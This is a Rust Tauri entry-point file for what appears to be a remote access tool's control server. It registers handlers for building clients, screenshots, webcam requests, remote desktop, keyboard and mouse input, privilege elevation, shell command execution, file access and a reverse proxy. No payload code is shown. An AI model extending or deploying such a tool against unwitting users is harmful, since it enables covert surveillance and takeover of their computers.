#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
use std::sync::{ Arc, Mutex };

mod handlers;
mod server;
mod commands;
mod client;
mod utils;

use handlers::{
    tauri::*,
    SharedTauriState,
    TauriState,
};

#[tokio::main(worker_threads = 3)]
async fn main() {
    tauri::Builder
        ::default()
        .manage(SharedTauriState(Arc::new(Mutex::new(TauriState::default()))))
        .invoke_handler(
            tauri::generate_handler![
                start_server,
                stop_server,
                fetch_state,
                build_client,
                fetch_clients,
                fetch_client,
                take_screenshot,
                request_webcam,
                manage_client,
                start_remote_desktop,
                stop_remote_desktop,
                send_mouse_click,
                send_keyboard_input,
                visit_website,
                send_messagebox,
                test_messagebox,
                elevate_client,
                handle_system_command,
                process_list,
                kill_process,
                manage_shell,
                execute_shell_command,
                read_files,
                manage_file,
                start_reverse_proxy,
                stop_reverse_proxy,
                read_icon,
                read_exe,
            ]
        )
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
